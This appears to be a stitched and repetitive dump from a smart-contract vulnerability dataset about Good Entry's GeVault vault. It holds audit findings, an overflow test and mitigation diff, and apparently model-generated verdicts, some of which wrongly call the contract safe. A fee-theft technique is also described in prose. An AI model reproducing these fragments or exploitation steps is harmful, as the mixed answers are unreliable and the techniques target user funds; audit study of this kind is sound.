There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

This calculation involves multiple floating-point divisions, which can lead to precision loss and result in a discrepancy between the calculated and actual token amounts.\n\nHere's a step-by-step analysis of the code:\n\n1. The function calculates the `valueX8` variable as `vaultValueX8 * liquidity / totalSupply()`. This calculation involves floating-point division, which can lead to precision loss.\n2. The `amount` variable is then calculated as `valueX8 * 10**ERC20(token).decimals() / oracle.getAssetPrice(token)`. This calculation involves two floating-point divisions, which can further exacerbate the precision loss.\n3. The `fee` variable is calculated as `amount * getAdjustedBaseFee(token == address(token1)) / 1e4`. This calculation involves another floating-point division, which can lead to even more precision loss.\n4. The `bal` variable is calculated as `amount - fee`. This calculation involves subtracting two potentially imprecise values, which can further exacerbate the precision loss.\n5. The contract then transfers the `bal` variable to the recipient's address. If the calculated value of `bal` is less than the actual value due to precision loss, the transfer will fail, leading to a revert due to insufficient balance.\n\nTo mitigate this vulnerability, the developer can consider tracking the balance of tokens before and after invoking the withdrawal function and then transferring the difference to the recipient rather than relying solely on the calculated withdrawal amount. This approach can ensure that the transferred token amount accurately reflects the tokens withdrawn, regardless of potential precision loss in the calculations.",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

The function `returnExpectedBalanceWithoutFees` calls the `getAmountsForLiquidity` function from the `LiquidityAmounts` contract, which expects the _sqrtPrice argument to be in the form of `uint160(sqrt(P))`, where `P` is the product of 2**192 and the price of token0 in terms of token1, as shown in the following line:\n\n`(amt0, amt1) = LiquidityAmounts.getAmountsForLiquidity( uint160( sqrt( (2 ** 192 * ((TOKEN0_PRICE * 10 ** TOKEN1.decimals) / TOKEN1_PRICE)) / ( 10 ** TOKEN0.decimals ) ) ), TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);`\n\nHere, the multiplication of `TOKEN0_PRICE` with `10 ** TOKEN1.decimals` and the division by `TOKEN1_PRICE` is performed to get the price of token0 in terms of token1.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the .

However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the .

Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1.

The reason is that there are no external calls made in the function `depositAndStash` before updating the state variables that track the contract's balance or the amount of resources it has allocated.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

The code uses `oracle.getAssetPrice(token)` to get the asset price, which may come from an external source, and calculates the `valueX8` variable based on the asset price.

The code does not calculate rewards accumulated or convert shares to token amount, which are the primary areas where the vulnerability can be introduced.\n4. The code does enforce a minimum amount of reserve indirectly through the `tvlCap` variable, which prevents the addition of liquidity if the total value locked (TVL) exceeds the maximum cap. This can help maintain a stable share price for the underlying token and prevent overflows to some extent.\n\nIn conclusion, the smart contract code does not appear to be vulnerable to the Arbitrary Share Price Manipulation Leading to Overflow and Fund Freezing vulnerability based on the provided description.

Here are the details of the analysis:\n\n1. The deposit function requires the token to be either token0, token1, or WETH (Wrapped Ether), and it checks for this condition with the `require` statement.

                "poc_patch": "No, the provided smart contract code does not appear to be vulnerable to the \"Unrestricted Pool Creation and Price Manipulation\" vulnerability. Here's the reasoning:\n\n1. The `deposit` function takes an address of a token (`address token`) and a deposit amount (`uint amount`) as input. The contract checks if the token is either `token0` or `token1`, which suggests that the pool creation is not entirely unrestricted.\n2. The contract also checks if the deposit amount is greater than zero, which helps prevent the creation of pools with insufficient liquidity.\n3. The contract uses an oracle (`oracle.getAssetPrice(token)`) to determine the price of the token, which reduces the risk of price manipulation.\n4. The `getAdjustedBaseFee` function, which calculates a fee based on the deposit amount, further discourages attackers from attempting to manipulate the system.\n5. The `tvlCap` variable limits the total value locked in the contract, which helps maintain the integrity of the overall decentralized financial system.\n\nHowever, it is important to note that the smart contract's security also depends on other factors, such as the implementation of the `oracle`, `getAdjustedBaseFee`, and `tvlCap` variables.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

It first obtains the `sqrtPriceX96` from the Uniswap pool and calculates the price of token0 (`priceX8`) in terms of token1 using appropriate scaling mechanisms:\n  a. Scales down the `sqrtPriceX96` by dividing it by 2**12 before squaring and multiplying.\n  b. Multiplies the result by 1e8 and divides it by 2**168 to convert it to the same unit as the oracle price.\n  c. Divides `priceX8` by 10**decimals1 to get the price of token0 in terms of token1.\n3. The oracle price is calculated as the product of 1e8, `oracle.getAssetPrice(address(token0))`, and `1 / oracle.getAssetPrice(address(token1))`. This calculation maintains precision as it uses integer arithmetic.\n4. The function checks if the oracle price is within 1% of the Uniswap price (`priceX8`).

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL. Reason: Arithmetic over/underflow] testOraclePrice() \n```\n\nThis will cause calculation still overflow, even using the widely used WBTC/WETH pair \n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nConsider to change the scale down using the recommended value from uniswap v3 library:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\n\nor change the scale down similar to the one used inside library\n\n```diff\n  function poolMatchesOracle() public view returns (bool matches){\n    (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();\n    \n    uint decimals0 = token0.decimals();\n    uint decimals1 = token1.decimals();\n    uint priceX8 = 10**decimals0;\n    // Overflow if dont scale down the sqrtPrice before div 2*192\n-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;\n+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;\n    priceX8 = priceX8 / 10**decimals1;\n    uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));\n    if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;\n  }\n```\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in 